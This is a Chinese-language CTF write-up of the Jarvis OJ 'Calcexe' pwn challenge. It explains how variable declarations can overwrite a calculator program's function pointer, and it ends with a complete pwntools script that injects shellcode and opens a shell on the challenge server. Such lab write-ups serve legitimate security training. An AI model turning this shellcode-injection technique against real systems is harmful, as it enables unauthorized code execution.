---
title: Jarvis OJ - Calcexe の Write-Up
date: 2021-02-04 14:28:26
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- Stack
---
## Introduction

题目捎带迷惑性，文件后缀为`.exe`，看起来是windows下的运行程序，结果在windows上根本无法运行。

<!-- more -->

## Step 1

checksec：

![](/img/Calcexe/Calcexe1.png)

依然是32位的ELF文件。

将程序在IDA中打开，在main函数中发现定义了10个功能：

![](/img/Calcexe/Calcexe2.png)

这是功能申明函数sub_804A719：

![](/img/Calcexe/Calcexe3.png)

所以程序运行是这样的：

![](/img/Calcexe/Calcexe4.png)

## Step 2

由于程序很长，所以就挑选关键部分来说。 程序申明了10个函数，如果能够控制这些函数的指针那么就可以控制程序跳转执行shellcode。

而在主函数后发现处理function的函数：

![](/img/Calcexe/Calcexe5.png)

`strtok()`是分割字符串的函数，这里用来处理空格。0x61是`'='`，0x34是`'“'`，所以根据伪代码发现程序允许通过`var`参数声明变量，命令格式为`var variable = “value”`。

这一段程序中还提到了下面的函数：

![](/img/Calcexe/Calcexe6.png)

分析sub_804A820函数发现程序寻址是通过比较变量名实现的，所以即使`var add = “eval”`也是程序允许的，这样我们就可以控制函数指针了。因此直接把某个函数的method改成shellcode即可。

## Step 3

解题脚本如下：

```
from pwn import *

context(arch = 'i386', os = 'linux')

sh = remote("pwn2.jarvisoj.com", 9892)

shellcode = asm(shellcraft.sh())
payload = 'var add = "'+ shellcode + '"'

sh.sendlineafter(">", payload)
sh.sendline('+')

sh.interactive()
sh.close()
```

脚本运行结果：

![](/img/Calcexe/Calcexe7.png)
